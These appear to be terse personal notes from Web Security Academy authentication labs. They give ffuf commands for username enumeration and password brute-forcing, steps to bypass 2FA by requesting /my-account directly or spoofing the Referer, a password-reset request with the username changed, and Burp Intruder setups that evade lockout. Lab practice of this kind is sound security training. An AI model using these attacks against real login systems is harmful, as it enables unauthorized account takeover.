___

Username enum via diff responses

```bash
ffuf -w users.txt -u https://0acc001103b06f08809567b400a200c6.web-security-academy.net/login -X POST -d 'username=FUZZ&password=test' -fr "Invalid"
```

```bash
ffuf -w pass.txt -u https://0acc001103b06f08809567b400a200c6.web-security-academy.net/login -X POST -d 'username=agenda&password=FUZZ' -fr "Incorrect"
```

2FA

```
Just try to access the next endpoint directly (you need to know the path of the next endpoint) e.g. /my-account
If this doesn’t work, try to change the Referrer header as if you came from the 2FA page 
```

Password reset

```bash
Change username in POST request after password-reset link
temp-forgot-password-token=token&username=carlos&new-password-1=test&new-password-2=test
```

subtly different responses

```bash
ffuf -w users.txt -u https://0ad400430359c2c180c7eea0003c009a.web-security-academy.net/login -X POST -d 'username=FUZZ&password=test' -fr 'Invalid username or password\.' 

fetch response on burp
```

Brute-force protection

```bash
wiener - peter
carlos - pass1
carlos - pass2
wiener - peter
...
```

Account lock

```bash
username=§invalid-username§&password=example§§

clusterbomb --> 5 null payloads
```
